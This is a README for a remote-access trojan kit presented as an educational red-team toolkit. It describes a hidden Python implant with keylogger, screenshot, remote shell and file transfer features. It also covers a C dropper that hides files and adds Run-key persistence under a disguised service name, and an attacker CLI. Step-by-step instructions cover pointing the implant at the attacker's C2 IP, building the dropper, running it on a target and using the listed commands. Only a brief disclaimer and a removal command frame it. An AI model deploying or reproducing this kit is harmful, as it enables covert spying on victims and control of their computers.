# VOIDCORE

Educational red-team toolkit that demonstrates a silent Python implant, C dropper, and command-line C2 controller.

**For authorized testing and research only.**

## What’s Included

- **Victim implant** – keylogger, screenshots, remote shell, file upload/download (runs hidden with `pythonw`)
- **C dropper** – writes the implant, sets hidden attributes, adds persistence via Run key
- **Attacker controller** – simple interactive CLI to control the implant

## Requirements

| Side     | Needs                          |
|----------|--------------------------------|
| Victim   | Windows 10/11, Python 3.8+     |
| Attacker | Python 3.8+                    |
| Dropper  | MinGW / MSVC (`gcc -mconsole`) |

Optional victim packages: `pynput`, `Pillow`

## Quick Start

1. **Set your IP** in `victim/syscache.py` and inside `dropper/dropper.c`:
   ```python
   C2 = ("YOUR.PUBLIC.IP", 5555)
   ```

2. **Start controller** (attacker machine):
   ```bash
   python attacker.py
   ```

3. **Build dropper**:
   ```bash
   gcc -mconsole dropper/dropper.c -o dropper.exe
   ```

4. Run `dropper.exe` on the target. The implant lands in `%LOCALAPPDATA%\cache\syscache.py`, starts silently, and registers for auto-start.

5. When the victim connects you get a prompt:
   ```
   RAT>
   ```

## Commands

```
ping                  check if alive
sysinfo               computer / user info
keylog                dump keystrokes
keylog_clear          wipe keylog
screenshot            save screen as screen.png
shell <cmd>           run command
cd <path>             change directory
pwd                   current directory
ls                    list files
download <path>       pull file
upload <local> <remote>  push file
rm <path>             delete file
exit                  close session
```

Any other text is treated as a shell command.

## Remove Persistence

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsCacheSvc" -ErrorAction SilentlyContinue
```

Or delete the value `WindowsCacheSvc` manually in `regedit` under  
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

## Disclaimer

This project is for security research and educational use in controlled environments only. Misuse against systems you do not own or have permission to test is illegal. The authors accept no liability.
